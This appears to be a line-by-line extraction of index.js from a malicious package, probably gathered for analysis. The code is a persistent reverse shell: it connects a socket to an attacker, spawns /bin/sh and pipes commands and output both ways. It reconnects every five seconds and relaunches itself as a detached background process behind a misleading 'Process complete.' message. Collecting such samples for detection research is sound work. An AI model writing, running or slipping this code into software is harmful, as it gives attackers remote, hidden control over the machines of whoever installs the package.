// File: tmp/tmplbomhtgu/twewewewest6/package/index.js
// ======================================================================
Line 1: const net = require("net")
Line 2: _tmp_4 = require("child_process")
Line 8: const client = new net.Socket()
Line 10: {
        console.log("Connected to the attacker.");

        // Spawn a shell
        const shell = spawn("/bin/sh", []);

        // Correctly handle bidirectional data flow
        client.on("data", (data) => {
            shell.stdin.write(data); // Write data from the attacker to the shell
        });

        shell.stdout.on("data", (data) => {
            client.write(data); // Send shell output back to the attacker
        });

        shell.stderr.on("data", (data) => {
            client.write(data); // Send shell error output back to the attacker
        });

        shell.on("close", () => {
            console.log("Shell closed. Exiting...");
            client.end();
        });
    }
Line 14: const shell = spawn("/bin/sh", [])
Line 17: {
            shell.stdin.write(data); // Write data from the attacker to the shell
        }
Line 18: shell.stdin.write(data)
Line 21: {
            client.write(data); // Send shell output back to the attacker
        }
Line 22: client.write(data)
Line 25: {
            client.write(data); // Send shell error output back to the attacker
        }
Line 26: client.write(data)
Line 29: {
            console.log("Shell closed. Exiting...");
            client.end();
        }
Line 31: client.end()
Line 35: {
        console.error("Connection error:", err.message);
        // Attempt to reconnect after a delay
        setTimeout(startReverseShell, 5000);
    }
Line 38: setTimeout(startReverseShell, 5000)
Line 41: {
        console.log("Connection closed. Reconnecting...");
        setTimeout(startReverseShell, 5000);
    }
Line 43: setTimeout(startReverseShell, 5000)
Line 48: process.argv.includes("--background")
Line 50: {
    const backgroundProcess = spawn("node", [__filename, "--background"], {
        detached: true,
        stdio: "ignore",
    });

    backgroundProcess.unref();
    console.log("Process complete.");
}
Line 51: const backgroundProcess = spawn("node", [__filename, "--background"], {
        detached: true,
        stdio: "ignore",
    })
